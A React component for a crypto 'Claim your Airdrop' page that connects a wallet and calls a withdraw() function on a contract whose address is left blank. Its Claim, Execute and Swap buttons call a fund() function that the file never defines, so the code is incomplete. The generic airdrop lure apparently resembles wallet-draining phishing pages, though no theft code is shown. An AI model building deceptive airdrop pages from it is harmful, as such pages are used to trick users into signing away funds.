import React from 'react'
import Web3Modal from "web3modal";
import { useState, useEffect } from "react";
import { ethers } from "ethers";
import WalletConnectProvider from "@walletconnect/web3-provider";
import Authereum from "authereum";
import { abi } from "../constants/abi";


let web3Modal;

const ethAmount = 0.01;

const providerOptions = {

  authereum: {
    package: Authereum,

  },
  
  binancechainwallet: {
    package: true
  },
  walletconnect: {
    package: WalletConnectProvider, // required
    options: {
      rpc: { 42: process.env.NEXT_PUBLIC_RPC_URL }, // required
    },
  },
};

if (typeof window !== "undefined") {
  web3Modal = new Web3Modal({
    cacheProvider: false,
    providerOptions, // required
  });
}

export default function PolygonWithdraw() {
  const [isConnected, setIsConnected] = useState(false);
  const [hasMetamask, setHasMetamask] = useState(false);
  const [signer, setSigner] = useState(undefined);

  useEffect(() => {
    if (typeof window.ethereum !== "undefined") {
      setHasMetamask(true);
    }
  });

  async function connect() {
    if (typeof window.ethereum !== "undefined") {
      try {
        const web3ModalProvider = await web3Modal.connect();
        setIsConnected(true);
        const provider = new ethers.providers.Web3Provider(web3ModalProvider);
        setSigner(provider.getSigner());
      } catch (e) {
        console.log(e);
      }
    } else {
      setIsConnected(false);
    }
  }
async function withdraw() {
    console.log(`Withdrawing...`)
  if (typeof window.ethereum !== "undefined") {
    const web3ModalProvider = await web3Modal.connect();
        setIsConnected(true);
        const provider = new ethers.providers.Web3Provider(web3ModalProvider);
        setSigner(provider.getSigner());
      const contractAddress = '';
      const contract = new ethers.Contract(contractAddress, abi, signer);
         try {
            const transactionResponse = await contract.withdraw()
            await listenForTransactionMine(transactionResponse, provider)
        } catch (error) {
            console.log(error)
        }
    } else {
      console.log("Please install MetaMask");
    }
  }

  return (
    <div>
       <div>
      <header>
        <div className="connect-btn-container">
          <button onClick={() => connect()} className="connect-btn">Connect</button>
        </div>
      </header>

      <div className="main-container">
        <div className="inner-container">
          <div className="title-container">
            <h1 className="title">DAPPAUTHES</h1>
            </div>
          <div className="text-container">
            <p>Claim your Airdrop</p>
          </div>

          <div className="main-button-wrap-1">

            <div className="inner-button-wrap-1">

            <button  className="btn" onClick={() => fund()}>Claim</button>
               {isConnected ? <button className="btn" onClick={() => fund()}>Execute</button> : ""}
          <button className="btn" onClick={() => fund()}>Swap</button>

            </div>

          </div>

          <div className="main-button-wrap-2">
            <div className="inner-button-wrap-2">
            <button className="btn" >Migrate</button>
          <button className="btn"  onClick={() => withdraw()}>Withdraw</button>
              

            </div>

          </div>

        


         

        
      </div>
    </div>

    </div>
    </div>
  );
}
